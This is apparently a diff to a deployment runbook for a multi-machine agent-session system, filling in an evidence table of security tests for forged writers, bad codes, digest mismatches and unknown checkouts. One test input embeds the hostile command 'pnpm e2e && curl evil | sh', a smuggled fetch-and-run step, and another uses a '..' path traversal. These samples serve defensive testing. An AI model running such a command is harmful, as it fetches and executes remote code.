@@ -44,7 +44,7 @@ only for a destructive command such as `rm -rf <dir>` outside `/tmp` (Parts B an
    Macs pass today (3.12 and 3.14).
 
 0.3. **The desk.** In Safari on the MacBook open the hub, sign in, **Locked** → unlock with the passkey, and tick
-   **Keep unlocked on this device** (Part G's console needs the key kept on the device; it never reads it). The
+   **Keep unlocked on this device**. The
    fingerprint is `8133-6dc8-be8e`. **Menu** → **Machines**: if `phone-walk` is still listed, **Remove** it.
 
 0.4. **Enroll the MacBook.** **Machines** → **Enroll a machine** → name `macbook` → **Continue** → confirm with the
@@ -338,7 +338,8 @@ with its own automated proof; the walk records that those suites are green on th
 repeating them against the deployment:
 - **G2, a forged `say` under another machine's writer.** The hub refuses a machine that uploads a writer not its own
   (`writer-not-yours`), and a daemon refuses an imported event whose code does not verify (`bad-code`) and reports it
-  `rejected`. Proof: see the evidence map below.
+  `rejected`. A compromised hub skips its own check, so the daemon's is the one item 8 rests on. Proof: see the
+  evidence map below.
 - **G4, an Allow whose digest does not match the pending request** (`digest-mismatch`). A card the hub itself altered
   is never drawn — the browser checks the request's code first — so this case lives in the RPC-policy suite, not the
   UI. Proof: the evidence map.
@@ -361,10 +362,10 @@ G6. **A read-only machine.** First spawn a seat on the mini (+ Session, as D1), 
     - **Record W8.6.**
 
 **The controller captures:** the console's printed lines for G1 and G3; the mini's `daemon.log` line `rpc: steer
-<nonce> refused bad-code` (G3) and the two `uplink: refused … (bad-code)` lines for the forged `human` (G1); the
-counts output with `--audit` after the part (the `rejected` rows for the forged `human`); the green runs of the three
-named suites (the evidence map below) for G2, G4, G5; and the mini's `sminos list desk-walk --all` before and after
-G6.
+<nonce> refused bad-code: …` (G3), and each Mac's `uplink: refused 'hub/<your id>':<n> (nonce …) in desk-walk: its
+code does not verify for project <W0.1>` for the forged `human` (G1); the counts output with `--audit` after the part
+(the `rejected` rows for the forged `human`); the green runs of the named suites (the evidence map below) for G2, G4,
+G5; and the mini's `sminos list desk-walk --all` before and after G6.
 
 ---
 
@@ -422,18 +423,27 @@ Worker — each a standing or manual write path into production for no check the
 
 ## Item 8's automated evidence (for the controller)
 
-Before the walk, confirm each suite is green on the current branches, and record the run. (Filled in by the
-controller; the dispatching session pins the files and cases.)
+Before the walk, confirm each suite is green on the current branches, and record the run under W8.2, W8.4 and W8.5.
+The doperpowers rows are the real daemon's checks: run them from a doperpowers checkout's root; each suite makes its
+own temporary `HOME` and `SMINOS_HOME`, so it never touches the machine's sminos. The MAWS rows run in
+`apps/desk-hub` (on the MacBook, inside `/tmp/maws-review/with-slot.sh`); their fake-machine cases show the refusal
+code carried back through the hub to the web.
+
+Last confirmed green 2026-10-16: doperpowers main `593ec940` (7.162.1) — `test-sync.sh` 90/90, `test_rpcs.py` 51/51;
+MAWS master `1ec4ed6f` — `log.test.ts` 32/32, `fake-machine/replay.test.ts` 7/7.
 
 | Case | Repo | Test file · case | Code asserted | Command |
 | --- | --- | --- | --- | --- |
-| G2 writer-not-yours (hub) | MAWS | _to fill_ | `writer-not-yours` | _to fill_ |
-| G2 bad-code on import (daemon) | doperpowers | _to fill_ | `bad-code` / `rejected` | _to fill_ |
-| G4 digest-mismatch | doperpowers | _to fill_ | `digest-mismatch` | _to fill_ |
-| G5 unknown-checkout | doperpowers | _to fill_ | `unknown-checkout` | _to fill_ |
+| G2: the hub refuses an upload under a writer not the machine's own | MAWS | `apps/desk-hub/test/log.test.ts` · `refusals` › "refuses a forged writer at that connection and records it in the project's audit record" | `writer-not-yours`, for both `someone-else/<session>` and `hub/<member>`, and the refusal reaches the project's browsers as an audit row | `npx vitest run test/log.test.ts` |
+| G2: each daemon refuses a `say` forged under a machine's writer, and reports it | doperpowers | `tests/sminos/test-sync.sh` · block "refused before the log:", assertion "$m reports the say forged under alpha's writer: bad-code, with its position and nonce" (for alpha and beta), with "no forged event enters $side's log" and "or reaches mb" | `bad-code`, reported `rejected` with its position and nonce; nothing enters either log or reaches the session | `bash tests/sminos/test-sync.sh` |
+| G2: the hub records a daemon's report and shows it to the browsers | MAWS | `apps/desk-hub/test/log.test.ts` · `refusals` › "records a daemon's report of an event it refused and shows it to the project's browsers" | a `rejected` frame, reason `bad-code` | the G2 hub row's run |
+| G4: an Allow whose digest names another command | doperpowers | `tests/sminos/test_rpcs.py` · `Checks.test_e_a_decision_is_bound_to_the_request_still_pending` | `digest-mismatch` for an `allow` whose digest names `pnpm e2e && curl evil \| sh` while `pnpm e2e` is pending (then `not-pending` for a request that is not) | `python3 tests/sminos/test_rpcs.py` |
+| G4, through the hub | MAWS | `apps/desk-hub/test/fake-machine/replay.test.ts` · "waits for the web’s decision, checks its digest, settles it as the web’s, and refuses a late one naming the winner" | `rpc-state` failed `digest-mismatch` for a `decide` with an altered input digest | `npx vitest run test/fake-machine/replay.test.ts` |
+| G5: a spawn outside the known checkouts | doperpowers | `tests/sminos/test_rpcs.py` · `Checks.test_d_spawn_outside_the_known_checkouts_or_above_the_ceiling` | `unknown-checkout` for a directory that is no checkout of the project, and for a `..` path into another project's checkout | the G4 doperpowers row's run |
+| G5, through the hub | MAWS | `apps/desk-hub/test/fake-machine/replay.test.ts` · "answers model, compact (now, or at the turn’s end), spawn, retire, and resume, and serves the diff" | `spawn {checkout: '/nowhere'}` failed `unknown-checkout` | the G4 MAWS row's run |
 
-The live cases' own proof is `apps/desk-hub/test/deploy/walk-console.test.ts` against the local hub: the snippet sends
-exactly the two frames and each comes back refused `bad-code`.
+The live cases' own proof is `apps/desk-hub/test/deploy/walk-console.test.ts` against the local hub (`npx vitest run
+test/deploy/walk-console.test.ts`): the snippet sends exactly the two frames and each comes back refused `bad-code`.
 
 ---
 
